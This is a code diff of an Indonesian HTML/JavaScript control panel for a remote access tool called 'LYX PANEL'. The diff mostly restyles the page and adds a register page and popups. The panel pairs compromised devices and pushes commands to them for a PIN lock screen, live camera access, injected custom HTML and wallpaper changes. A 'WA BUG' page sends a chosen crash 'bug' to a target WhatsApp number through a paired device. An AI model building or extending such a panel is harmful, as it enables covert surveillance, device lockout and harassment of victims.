@@ -8,16 +8,9 @@
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;-webkit-tap-highlight-color:transparent}
 
 /* ============ BACKGROUND GALAXY ============ */
-body{
-  background:#000;
-  color:#00ff88;
-  min-height:100vh;
-  overflow-x:hidden;
-  position:relative;
-}
+body{background:#000;color:#00ff88;min-height:100vh;overflow-x:hidden;position:relative}
 body::before{
-  content:'';
-  position:fixed;inset:0;
+  content:'';position:fixed;inset:0;
   background:
     radial-gradient(ellipse at 20% 30%, rgba(120,0,255,.25) 0%, transparent 50%),
     radial-gradient(ellipse at 80% 70%, rgba(0,200,255,.20) 0%, transparent 50%),
@@ -26,8 +19,7 @@ body::before{
   z-index:-3;
 }
 body::after{
-  content:'';
-  position:fixed;inset:0;
+  content:'';position:fixed;inset:0;
   background-image:
     radial-gradient(2px 2px at 20px 30px, #fff, transparent),
     radial-gradient(1px 1px at 90px 70px, #0f0, transparent),
@@ -38,21 +30,15 @@ body::after{
     radial-gradient(2px 2px at 700px 300px, #fff, transparent);
   background-size:800px 400px;
   animation:stars 60s linear infinite;
-  z-index:-2;
-  opacity:.7;
+  z-index:-2;opacity:.7;
 }
-@keyframes stars{
-  from{background-position:0 0}
-  to{background-position:800px 400px}
-}
+@keyframes stars{from{background-position:0 0}to{background-position:800px 400px}}
 
 /* ============ GARIS TEBEL ============ */
 .thick-line{
-  height:4px;
+  height:4px;border-radius:4px;margin:14px 0;
   background:linear-gradient(90deg, transparent, #00ff88, #00ccff, #00ff88, transparent);
   box-shadow:0 0 15px #00ff88, 0 0 30px #00ff88;
-  border-radius:4px;
-  margin:14px 0;
 }
 .thick-line.purple{
   background:linear-gradient(90deg, transparent, #aa00ff, #ff00aa, #aa00ff, transparent);
@@ -62,12 +48,9 @@ body::after{
 /* ============ HEADER ============ */
 .header{
   display:flex;justify-content:space-between;align-items:center;
-  padding:16px 20px;
-  margin:16px;
-  border:3px solid #00ff88;
-  border-radius:12px;
-  background:rgba(0,20,10,.6);
-  backdrop-filter:blur(10px);
+  padding:16px 20px;margin:16px;
+  border:3px solid #00ff88;border-radius:12px;
+  background:rgba(0,20,10,.6);backdrop-filter:blur(10px);
   box-shadow:0 0 25px rgba(0,255,136,.5), inset 0 0 25px rgba(0,255,136,.1);
 }
 .logo{display:flex;align-items:center;gap:12px}
@@ -79,12 +62,9 @@ body::after{
 
 /* ============ CARD ============ */
 .card{
-  border:3px solid #00ff88;
-  border-radius:14px;
-  background:rgba(0,20,10,.55);
-  backdrop-filter:blur(12px);
-  padding:22px;
-  margin:16px;
+  border:3px solid #00ff88;border-radius:14px;
+  background:rgba(0,20,10,.55);backdrop-filter:blur(12px);
+  padding:22px;margin:16px;
   box-shadow:0 0 25px rgba(0,255,136,.35), inset 0 0 30px rgba(0,255,136,.05);
 }
 .card h2{font-size:14px;letter-spacing:3px;margin-bottom:14px;text-transform:uppercase;text-shadow:0 0 8px #00ff88}
@@ -92,49 +72,31 @@ body::after{
 /* ============ BUTTON ============ */
 button{
   background:linear-gradient(135deg, rgba(0,255,136,.15), rgba(0,200,255,.1));
-  border:2px solid #00ff88;
-  color:#00ff88;
-  padding:14px 22px;
-  border-radius:10px;
-  cursor:pointer;
-  letter-spacing:2px;
-  font-size:12px;
-  font-weight:800;
-  text-transform:uppercase;
-  transition:.25s;
-  font-family:inherit;
+  border:2px solid #00ff88;color:#00ff88;
+  padding:14px 22px;border-radius:10px;cursor:pointer;
+  letter-spacing:2px;font-size:12px;font-weight:800;
+  text-transform:uppercase;transition:.25s;font-family:inherit;
   box-shadow:0 0 12px rgba(0,255,136,.4);
 }
 button:hover, button:active{
-  background:#00ff88;
-  color:#000;
+  background:#00ff88;color:#000;
   box-shadow:0 0 25px #00ff88, 0 0 50px #00ff88;
   transform:translateY(-2px);
 }
-button.warn{
-  border-color:#ffaa00;color:#ffaa00;
+button.warn{border-color:#ffaa00;color:#ffaa00;
   background:linear-gradient(135deg, rgba(255,170,0,.15), rgba(255,80,0,.1));
-  box-shadow:0 0 12px rgba(255,170,0,.4);
-}
+  box-shadow:0 0 12px rgba(255,170,0,.4);}
 button.warn:hover{background:#ffaa00;color:#000;box-shadow:0 0 25px #ffaa00}
-button.danger{
-  border-color:#ff2244;color:#ff2244;
+button.danger{border-color:#ff2244;color:#ff2244;
   background:linear-gradient(135deg, rgba(255,34,68,.15), rgba(255,0,80,.1));
-  box-shadow:0 0 12px rgba(255,34,68,.4);
-}
+  box-shadow:0 0 12px rgba(255,34,68,.4);}
 button.danger:hover{background:#ff2244;color:#000;box-shadow:0 0 25px #ff2244}
 
 /* ============ INPUT ============ */
 input, select, textarea{
-  width:100%;
-  background:rgba(0,0,0,.7);
-  border:2px solid #00ff88;
-  color:#00ff88;
-  padding:12px 14px;
-  border-radius:10px;
-  font-family:inherit;
-  font-size:14px;
-  outline:none;
+  width:100%;background:rgba(0,0,0,.7);border:2px solid #00ff88;
+  color:#00ff88;padding:12px 14px;border-radius:10px;
+  font-family:inherit;font-size:14px;outline:none;
   box-shadow:inset 0 0 15px rgba(0,255,136,.15);
 }
 input:focus, select:focus, textarea:focus{
@@ -142,20 +104,12 @@ input:focus, select:focus, textarea:focus{
 }
 label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:.8;text-transform:uppercase}
 
-/* ============ CODE PAIRING ============ */
+/* ============ CODE ============ */
 .code{
-  flex:1;min-width:180px;
-  background:#000;
-  border:3px solid #00ff88;
-  border-radius:12px;
-  padding:16px;
-  font-size:28px;
-  letter-spacing:12px;
-  text-align:center;
-  font-family:'Courier New',monospace;
-  font-weight:900;
-  color:#00ff88;
-  text-shadow:0 0 15px #00ff88, 0 0 30px #00ff88;
+  flex:1;min-width:180px;background:#000;border:3px solid #00ff88;
+  border-radius:12px;padding:16px;font-size:28px;letter-spacing:12px;
+  text-align:center;font-family:'Courier New',monospace;font-weight:900;
+  color:#00ff88;text-shadow:0 0 15px #00ff88, 0 0 30px #00ff88;
   box-shadow:inset 0 0 25px rgba(0,255,136,.3), 0 0 25px rgba(0,255,136,.4);
 }
 .row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
@@ -166,8 +120,7 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
   border:3px solid #00ff88;border-radius:12px;
   background:rgba(0,255,136,.05);
   padding:16px;display:flex;justify-content:space-between;align-items:center;
-  transition:.25s;
-  box-shadow:0 0 15px rgba(0,255,136,.25);
+  transition:.25s;box-shadow:0 0 15px rgba(0,255,136,.25);
 }
 .dcard:hover{background:rgba(0,255,136,.1);box-shadow:0 0 25px rgba(0,255,136,.6);transform:translateY(-2px)}
 .dinfo{display:flex;align-items:center;gap:14px}
@@ -179,8 +132,7 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
 .dgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:14px;padding:0 16px}
 .fcard{
   border:3px solid #00ff88;border-radius:12px;
-  background:rgba(0,20,10,.55);
-  backdrop-filter:blur(10px);
+  background:rgba(0,20,10,.55);backdrop-filter:blur(10px);
   padding:18px;cursor:pointer;transition:.25s;position:relative;
   box-shadow:0 0 15px rgba(0,255,136,.3);
 }
@@ -197,10 +149,8 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
 .mov.active{display:flex}
 .modal{
   border:3px solid #00ff88;border-radius:14px;
-  background:rgba(0,10,5,.95);
-  padding:24px;max-width:600px;width:100%;
-  box-shadow:0 0 50px rgba(0,255,136,.5);
-  max-height:90vh;overflow-y:auto;
+  background:rgba(0,10,5,.95);padding:24px;max-width:600px;width:100%;
+  box-shadow:0 0 50px rgba(0,255,136,.5);max-height:90vh;overflow-y:auto;
 }
 .modal h2{font-size:15px;letter-spacing:3px;margin-bottom:18px;text-shadow:0 0 10px #00ff88}
 .mact{display:flex;gap:10px;margin-top:20px;justify-content:flex-end;flex-wrap:wrap}
@@ -214,12 +164,9 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
 .bottom-nav{
   position:fixed;bottom:0;left:0;right:0;
   display:flex;justify-content:space-around;align-items:center;
-  background:rgba(0,10,5,.95);
-  backdrop-filter:blur(15px);
-  border-top:3px solid #00ff88;
-  box-shadow:0 -5px 30px rgba(0,255,136,.4);
-  padding:10px 0;
-  z-index:900;
+  background:rgba(0,10,5,.95);backdrop-filter:blur(15px);
+  border-top:3px solid #00ff88;box-shadow:0 -5px 30px rgba(0,255,136,.4);
+  padding:10px 0;z-index:900;
 }
 .nav-btn{
   display:flex;flex-direction:column;align-items:center;gap:4px;
@@ -237,117 +184,135 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
 .page{display:none;padding-bottom:100px}
 .page.active{display:block}
 
-/* ============ LOGIN ============ */
-.auth-wrap{
-  max-width:400px;margin:60px auto;padding:0 20px;
-}
+/* ============ AUTH ============ */
+.auth-wrap{max-width:400px;margin:60px auto;padding:0 20px}
 .auth-box{
   border:3px solid #00ff88;border-radius:16px;
-  background:rgba(0,20,10,.7);
-  backdrop-filter:blur(15px);
+  background:rgba(0,20,10,.7);backdrop-filter:blur(15px);
   padding:30px;
   box-shadow:0 0 40px rgba(0,255,136,.5), inset 0 0 40px rgba(0,255,136,.1);
 }
-.auth-title{
-  font-size:24px;text-align:center;letter-spacing:6px;
-  text-shadow:0 0 15px #00ff88;margin-bottom:8px;font-weight:900;
-}
+.auth-title{font-size:24px;text-align:center;letter-spacing:6px;text-shadow:0 0 15px #00ff88;margin-bottom:8px;font-weight:900}
 .auth-sub{text-align:center;font-size:11px;opacity:.6;letter-spacing:3px;margin-bottom:20px}
 
-/* ============ LOADING BUG ============ */
-.bug-loading{
-  display:none;position:fixed;inset:0;
-  background:rgba(0,0,0,.95);z-index:2000;
-  justify-content:center;align-items:center;flex-direction:column;
-}
+/* ============ LOADING ============ */
+.bug-loading{display:none;position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:2000;justify-content:center;align-items:center;flex-direction:column}
 .bug-loading.active{display:flex}
-.bug-spinner{
-  width:80px;height:80px;
-  border:6px solid rgba(0,255,136,.2);
-  border-top-color:#00ff88;
-  border-radius:50%;
-  animation:spin 1s linear infinite;
-  box-shadow:0 0 30px #00ff88;
-}
+.bug-spinner{width:80px;height:80px;border:6px solid rgba(0,255,136,.2);border-top-color:#00ff88;border-radius:50%;animation:spin 1s linear infinite;box-shadow:0 0 30px #00ff88}
 @keyframes spin{to{transform:rotate(360deg)}}
-.bug-text{
-  margin-top:24px;font-size:14px;letter-spacing:4px;
-  text-shadow:0 0 15px #00ff88;
-  animation:pulse 1.2s infinite;
+.bug-text{margin-top:24px;font-size:14px;letter-spacing:4px;text-shadow:0 0 15px #00ff88;animation:pulse 1.2s infinite}
+
+/* ============ POPUP CUSTOM (GANTI ALERT) ============ */
+.popup{
+  display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:3000;
+  justify-content:center;align-items:center;padding:20px;backdrop-filter:blur(10px);
 }
-.bug-success{
-  display:none;position:fixed;inset:0;
-  background:rgba(0,0,0,.95);z-index:2001;
-  justify-content:center;align-items:center;flex-direction:column;
+.popup.active{display:flex}
+.popup-box{
+  border:3px solid #00ff88;border-radius:18px;
+  background:linear-gradient(135deg, rgba(0,20,10,.98), rgba(0,30,20,.98));
+  padding:34px 28px;max-width:380px;width:100%;text-align:center;
+  box-shadow:0 0 60px rgba(0,255,136,.6), inset 0 0 40px rgba(0,255,136,.1);
+  animation:popIn .4s cubic-bezier(.34,1.56,.64,1);
 }
+@keyframes popIn{
+  from{transform:scale(.7);opacity:0}
+  to{transform:scale(1);opacity:1}
+}
+.popup-icon{
+  width:90px;height:90px;margin:0 auto 18px;
+  border:4px solid #00ff88;border-radius:50%;
+  display:flex;justify-content:center;align-items:center;
+  font-size:48px;color:#00ff88;font-weight:bold;
+  box-shadow:0 0 40px #00ff88, inset 0 0 20px rgba(0,255,136,.3);
+  text-shadow:0 0 20px #00ff88;
+  animation:glow 1.5s ease-in-out infinite alternate;
+}
+@keyframes glow{
+  from{box-shadow:0 0 30px #00ff88}
+  to{box-shadow:0 0 60px #00ff88, 0 0 90px #00ff88}
+}
+.popup-title{font-size:20px;letter-spacing:4px;text-shadow:0 0 15px #00ff88;margin-bottom:10px;font-weight:900}
+.popup-desc{font-size:12px;opacity:.7;letter-spacing:2px;margin-bottom:22px;line-height:1.5}
+.popup-btn{
+  background:linear-gradient(135deg, #00ff88, #00ccff);
+  border:none;color:#000;padding:14px 40px;border-radius:10px;
+  letter-spacing:3px;font-size:13px;font-weight:900;text-transform:uppercase;
+  box-shadow:0 0 25px rgba(0,255,136,.7);cursor:pointer;
+}
+.popup-btn:hover{transform:scale(1.05);box-shadow:0 0 40px #00ff88}
+
+/* ============ SUCCESS ANIMATION ============ */
+.bug-success{display:none;position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:2001;justify-content:center;align-items:center;flex-direction:column}
 .bug-success.active{display:flex}
 .success-icon{
-  width:100px;height:100px;
-  border:6px solid #00ff88;border-radius:50%;
+  width:100px;height:100px;border:6px solid #00ff88;border-radius:50%;
   display:flex;justify-content:center;align-items:center;
-  font-size:50px;color:#00ff88;
-  box-shadow:0 0 40px #00ff88;
-  animation:pop .5s ease;
+  font-size:50px;color:#00ff88;box-shadow:0 0 40px #00ff88;animation:pop .5s ease;
 }
-@keyframes pop{
-  0%{transform:scale(0)}
-  70%{transform:scale(1.15)}
-  100%{transform:scale(1)}
-}
-.success-text{
-  margin-top:24px;font-size:18px;letter-spacing:4px;
-  text-shadow:0 0 20px #00ff88;font-weight:900;
-}
+@keyframes pop{0%{transform:scale(0)}70%{transform:scale(1.15)}100%{transform:scale(1)}}
+.success-text{margin-top:24px;font-size:18px;letter-spacing:4px;text-shadow:0 0 20px #00ff88;font-weight:900}
 
-/* ============ WHATSAPP BUG MENU ============ */
-.wa-slider{
-  display:flex;gap:12px;overflow-x:auto;padding:4px 0 20px;
-  scrollbar-width:none;
-}
+/* ============ WA BUG ============ */
+.wa-slider{display:flex;gap:12px;overflow-x:auto;padding:4px 0 20px;scrollbar-width:none}
 .wa-slider::-webkit-scrollbar{display:none}
 .wa-opt{
-  flex:0 0 auto;
-  border:2px solid #25D366;border-radius:12px;
-  background:rgba(37,211,102,.1);
-  padding:14px 22px;
-  color:#25D366;font-size:12px;letter-spacing:2px;
-  font-weight:bold;cursor:pointer;transition:.2s;
-  font-family:inherit;text-transform:uppercase;
+  flex:0 0 auto;border:2px solid #25D366;border-radius:12px;
+  background:rgba(37,211,102,.1);padding:14px 22px;
+  color:#25D366;font-size:12px;letter-spacing:2px;font-weight:bold;
+  cursor:pointer;transition:.2s;font-family:inherit;text-transform:uppercase;
   box-shadow:0 0 10px rgba(37,211,102,.3);
 }
-.wa-opt.active{
-  background:#25D366;color:#000;
-  box-shadow:0 0 25px #25D366;
-}
+.wa-opt.active{background:#25D366;color:#000;box-shadow:0 0 25px #25D366}
 .wa-opt:hover{transform:translateY(-2px)}
 </style>
 </head>
 <body>
 
-<!-- ============ PAGE: AUTH (LOGIN / REGISTER) ============ -->
+<!-- ============ PAGE: LOGIN ============ -->
 <div class="page active" id="pageAuth">
   <div class="auth-wrap">
     <div class="auth-box">
       <div class="auth-title" id="authTitle">LOGIN</div>
       <div class="auth-sub" id="authSub">LYX PANEL SYSTEM</div>
-
       <div class="thick-line"></div>
-
       <label>Username</label>
       <input type="text" id="authUser" placeholder="username">
-
       <label>Password</label>
       <input type="password" id="authPass" placeholder="password">
-
       <button style="width:100%;margin-top:20px" onclick="doLogin()">LOGIN</button>
-      <button style="width:100%;margin-top:10px" class="warn" onclick="showRegister()">CREATE ACCOUNT</button>
-
+      <button style="width:100%;margin-top:10px" class="warn" onclick="goPage('register')">CREATE ACCOUNT</button>
       <div class="thick-line purple"></div>
     </div>
   </div>
 </div>
 
-<!-- ============ PAGE: BERANDA (ACCOUNT INFO) ============ -->
+<!-- ============ PAGE: REGISTER (HALAMAN KHUSUS) ============ -->
+<div class="page" id="pageRegister">
+  <div class="auth-wrap">
+    <div class="auth-box">
+      <div class="auth-title">CREATE ACCOUNT</div>
+      <div class="auth-sub">DAFTAR AKUN BARU</div>
+      <div class="thick-line purple"></div>
+
+      <label>Username</label>
+      <input type="text" id="regUser" placeholder="username baru">
+
+      <label>Password</label>
+      <input type="password" id="regPass" placeholder="password">
+
+      <label>Konfirmasi Password</label>
+      <input type="password" id="regPass2" placeholder="ulangi password">
+
+      <button style="width:100%;margin-top:22px" onclick="doRegister()">BUAT ACCOUNT</button>
+      <button style="width:100%;margin-top:10px" class="danger" onclick="goPage('auth')">KEMBALI</button>
+
+      <div class="thick-line"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ============ PAGE: BERANDA ============ -->
 <div class="page" id="pageBeranda">
   <div class="header">
     <div class="logo">
@@ -355,7 +320,6 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
       <h1>BERANDA</h1>
     </div>
   </div>
-
   <div class="card">
     <h2>Informasi Account</h2>
     <div class="thick-line"></div>
@@ -369,7 +333,7 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
   </div>
 </div>
 
-<!-- ============ PAGE: RAT (DEVICE LIST + DASHBOARD) ============ -->
+<!-- ============ PAGE: RAT ============ -->
 <div class="page" id="pageRat">
   <div class="header">
     <div class="logo">
@@ -380,7 +344,6 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
       <span class="dot" id="wsDot"></span><span id="wsStat">CONNECTING</span>
     </div>
   </div>
-
   <div class="card">
     <h2>Pairing Code</h2>
     <div class="row">
@@ -389,7 +352,6 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
       <button onclick="copyCode()">Copy</button>
     </div>
   </div>
-
   <div class="card">
     <h2>Device List</h2>
     <div class="thick-line"></div>
@@ -398,7 +360,6 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
     </div>
     <button style="width:100%;margin-top:12px" onclick="refreshDev()">REFRESH DEVICE</button>
   </div>
-
   <div id="dashboard" style="display:none">
     <div class="card">
       <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px">
@@ -413,7 +374,7 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
   </div>
 </div>
 
-<!-- ============ PAGE: WHATSAPP BUG ============ -->
+<!-- ============ PAGE: WA BUG ============ -->
 <div class="page" id="pageWA">
   <div class="header">
     <div class="logo">
@@ -421,14 +382,12 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
       <h1 style="color:#25D366;text-shadow:0 0 12px #25D366">WA BUG</h1>
     </div>
   </div>
-
   <div class="card">
     <h2>Target Nomor WhatsApp</h2>
     <div class="thick-line"></div>
     <label>Nomor Target (contoh: 628123456789)</label>
     <input type="tel" id="waNumber" placeholder="628xxxxxxxxxx">
   </div>
-
   <div class="card">
     <h2>Pilih Bug</h2>
     <div class="thick-line purple"></div>
@@ -441,11 +400,8 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
     </div>
     <p style="font-size:10px;opacity:.5;letter-spacing:1px;margin-top:10px">Geser → tap untuk pilih bug</p>
   </div>
-
   <div class="card">
-    <button class="warn" style="width:100%;font-size:14px;padding:18px" onclick="sendBug()">
-      KIRIM BUG
-    </button>
+    <button class="warn" style="width:100%;font-size:14px;padding:18px" onclick="sendBug()">KIRIM BUG</button>
   </div>
 </div>
 
@@ -465,7 +421,7 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
   </button>
 </div>
 
-<!-- ============ LOADING BUG ============ -->
+<!-- ============ LOADING ============ -->
 <div class="bug-loading" id="bugLoading">
   <div class="bug-spinner"></div>
   <div class="bug-text">MENGIRIM BUG...</div>
@@ -476,7 +432,17 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
   <div class="success-text">BUG SUKSES DIKIRIM</div>
 </div>
 
-<!-- ============ MODAL ============ -->
+<!-- ============ POPUP CUSTOM ============ -->
+<div class="popup" id="popup">
+  <div class="popup-box">
+    <div class="popup-icon" id="popupIcon">✓</div>
+    <div class="popup-title" id="popupTitle">BERHASIL</div>
+    <div class="popup-desc" id="popupDesc">-</div>
+    <button class="popup-btn" onclick="closePopup()">OKE</button>
+  </div>
+</div>
+
+<!-- ============ MODAL FEATURE ============ -->
 <div class="mov" id="mov"><div class="modal" id="modal"></div></div>
 
 <script>
@@ -498,51 +464,71 @@ const S = {
     wallpaper:{active:false}
   }
 };
-let camStream=null, screenStream=null;
+let camStream=null;
 
-/* ============ CEK LOGIN ============ */
+/* ============ BOOT ============ */
 window.addEventListener('load', () => {
-  if (S.user) {
-    // udah pernah login → langsung masuk RAT
+  if (S.user){
     showBottomNav();
     goPage('rat');
     connectWS();
   } else {
-    // belum login → halaman auth
     goPage('auth');
   }
 });
+
+/* ============ POPUP ============ */
+function showPopup(icon, title, desc){
+  document.getElementById('popupIcon').textContent = icon;
+  document.getElementById('popupTitle').textContent = title;
+  document.getElementById('popupDesc').textContent = desc;
+  document.getElementById('popup').classList.add('active');
+}
+function closePopup(){
+  document.getElementById('popup').classList.remove('active');
+}
 
 /* ============ AUTH ============ */
 function doLogin(){
   const u = document.getElementById('authUser').value.trim();
   const p = document.getElementById('authPass').value.trim();
-  if (!u || !p){ alert('Isi username & password'); return; }
+  if (!u || !p){ showPopup('!','GAGAL','Isi username & password dulu'); return; }
   S.user = u;
   localStorage.setItem('lyx_user', u);
   localStorage.setItem('lyx_last', new Date().toLocaleString());
-  document.getElementById('infoUser').textContent = u;
-  document.getElementById('infoLast').textContent = localStorage.getItem('lyx_last');
-  showBottomNav();
-  goPage('rat');
-  connectWS();
+  showPopup('✓','LOGIN BERHASIL','Selamat datang, ' + u);
+  setTimeout(() => {
+    closePopup();
+    showBottomNav();
+    goPage('rat');
+    connectWS();
+  }, 1500);
 }
 
-function showRegister(){
-  const u = prompt('Username baru:');
-  if (!u) return;
-  const p = prompt('Password baru:');
-  if (!p) return;
+function doRegister(){
+  const u = document.getElementById('regUser').value.trim();
+  const p = document.getElementById('regPass').value.trim();
+  const p2 = document.getElementById('regPass2').value.trim();
+
+  if (!u || !p){ showPopup('!','GAGAL','Isi semua field dulu'); return; }
+  if (p !== p2){ showPopup('!','GAGAL','Password gak sama'); return; }
+
   localStorage.setItem('lyx_user', u);
   localStorage.setItem('lyx_pass', p);
   localStorage.setItem('lyx_last', new Date().toLocaleString());
-  alert('YEY ACCOUNT SUDAH DI BUAT');
+
+  // popup YEY ACCOUNT SUDAH DI BUAT
+  showPopup('✓', 'YEY ACCOUNT SUDAH DI BUAT', 'Selamat datang, ' + u + '! Akun berhasil dibuat.');
+
   S.user = u;
   document.getElementById('infoUser').textContent = u;
-  document.getElementById('infoLast').textContent = localStorage.getItem('lyx_last');
-  showBottomNav();
-  goPage('rat');
-  connectWS();
+
+  setTimeout(() => {
+    closePopup();
+    showBottomNav();
+    goPage('rat');
+    connectWS();
+  }, 1800);
 }
 
 function doLogout(){
@@ -555,11 +541,12 @@ function showBottomNav(){
   document.getElementById('bottomNav').style.display = 'flex';
 }
 
-/* ============ PAGE NAVIGATION ============ */
+/* ============ PAGE NAV ============ */
 function goPage(name){
   document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
   document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
   if (name === 'auth'){ document.getElementById('pageAuth').classList.add('active'); return; }
+  if (name === 'register'){ document.getElementById('pageRegister').classList.add('active'); return; }
   if (name === 'beranda'){
     document.getElementById('pageBeranda').classList.add('active');
     document.getElementById('navBeranda').classList.add('active');
@@ -579,12 +566,12 @@ function connectWS(){
   if (S.ws && S.ws.readyState === 1) return;
   const proto = location.protocol === 'https:' ? 'wss' : 'ws';
   S.ws = new WebSocket(proto + '://' + location.host);
-  S.ws.onopen = () => { log('WS connected'); dot(true); S.ws.send(JSON.stringify({type:'panel_hello'})); };
-  S.ws.onclose = () => { log('WS closed'); dot(false); setTimeout(connectWS, 3000); };
+  S.ws.onopen = () => { dot(true); S.ws.send(JSON.stringify({type:'panel_hello'})); };
+  S.ws.onclose = () => { dot(false); setTimeout(connectWS, 3000); };
   S.ws.onmessage = (e) => {
     let m; try{ m = JSON.parse(e.data); }catch{ return; }
     if (m.type === 'device_list'){ S.devices = m.devices || []; renderDev(); }
-    if (m.type === 'device_paired'){ S.devices.push(m.device); renderDev(); log('Device paired: ' + m.device.name); }
+    if (m.type === 'device_paired'){ S.devices.push(m.device); renderDev(); }
     if (m.type === 'device_offline'){ S.devices = S.devices.filter(d => d.id !== m.deviceId); renderDev(); }
   };
 }
@@ -601,12 +588,11 @@ async function genCode(){
   const j = await r.json();
   S.pairCode = j.code;
   document.getElementById('pairCode').textContent = j.code;
-  log('Code: ' + j.code);
 }
 function copyCode(){
-  if (!S.pairCode) return log('Generate dulu');
+  if (!S.pairCode) return;
   navigator.clipboard.writeText(S.pairCode);
-  log('Copied: ' + S.pairCode);
+  showPopup('✓','COPIED','Code ' + S.pairCode + ' berhasil disalin');
 }
 
 /* ============ DEVICE LIST ============ */
@@ -693,7 +679,7 @@ function openF(k){
     <label>PIN</label><input id="i-pin" value="${f.pin}" maxlength="6">
     <label>Pesan</label><textarea id="i-msg">${f.message}</textarea>`;
   if (k === 'camera') h = `<h2>3. LIVE CAMERA</h2>
-    <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('camera',this);startCam()"></div></div>
+    <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('camera',this)"></div></div>
     <label>Kamera</label><select id="i-facing"><option value="front" ${f.facing==='front'?'selected':''}>Depan</option><option value="back" ${f.facing==='back'?'selected':''}>Belakang</option></select>`;
   if (k === 'customhtml') h = `<h2>4. CUSTOM HTML</h2>
     <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('customhtml',this)"></div></div>
@@ -719,7 +705,6 @@ function openF(k){
     <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('wallpaper',this)"></div></div>`;
   h += `<div class="mact"><button onclick="closeM()">TUTUP</button><button onclick="apply('${k}')">TERAPKAN</button></div>`;
   document.getElementById('modal').innerHTML = h;
-  if (k === 'camera' && f.active) startCam();
 }
 function closeM(){ document.getElementById('mov').classList.remove('active'); stopPrev(); }
 
@@ -729,7 +714,6 @@ function tog(k, el){
   el.classList.toggle('on');
   upBadge(k);
   send(k, {active: S.f[k].active});
-  log('[' + k + '] ' + (S.f[k].active ? 'ON' : 'OFF'));
 }
 function upBadge(k){
   const b = document.getElementById('b-' + k);
@@ -755,28 +739,21 @@ function apply(k){
 
 /* ============ SEND ============ */
 async function send(feature, data){
-  if (!S.active){ log('No device'); return; }
+  if (!S.active) return;
   await fetch('/api/command', {
     method:'POST', headers:{'Content-Type':'application/json'},
     body: JSON.stringify({device: S.active.id, feature, data})
   });
-  log('>> ' + feature);
 }
 
 /* ============ PREVIEW ============ */
 async function startCam(){
   stopPrev();
-  try{
-    camStream = await navigator.mediaDevices.getUserMedia({video:true});
-  }catch(e){ log('cam err'); }
+  try{ camStream = await navigator.mediaDevices.getUserMedia({video:true}); }catch(e){}
 }
 function stopPrev(){
   camStream?.getTracks().forEach(t => t.stop()); camStream = null;
-  screenStream?.getTracks().forEach(t => t.stop()); screenStream = null;
 }
-
-/* ============ LOG ============ */
-function log(m){ console.log('[' + new Date().toLocaleTimeString() + '] ' + m); }
 
 /* ============ WA BUG ============ */
 function selBug(el, name){
@@ -787,14 +764,12 @@ function selBug(el, name){
 
 async function sendBug(){
   const num = document.getElementById('waNumber').value.trim();
-  if (!num){ alert('Masukin nomor WA target dulu'); return; }
-  if (!S.waBug){ alert('Pilih jenis bug dulu'); return; }
-  if (!S.active){ alert('Belum ada device terpairing'); return; }
+  if (!num){ showPopup('!','GAGAL','Masukin nomor WA target dulu'); return; }
+  if (!S.waBug){ showPopup('!','GAGAL','Pilih jenis bug dulu'); return; }
+  if (!S.active){ showPopup('!','GAGAL','Belum ada device terpairing'); return; }
 
-  // tampilkan loading 4 detik
   document.getElementById('bugLoading').classList.add('active');
 
-  // kirim command ke device target
   await fetch('/api/command', {
     method:'POST', headers:{'Content-Type':'application/json'},
     body: JSON.stringify({
@@ -804,7 +779,6 @@ async function sendBug(){
     })
   });
 
-  // tunggu 4 detik lalu tampilkan sukses
   setTimeout(() => {
     document.getElementById('bugLoading').classList.remove('active');
     document.getElementById('bugSuccess').classList.add('active');
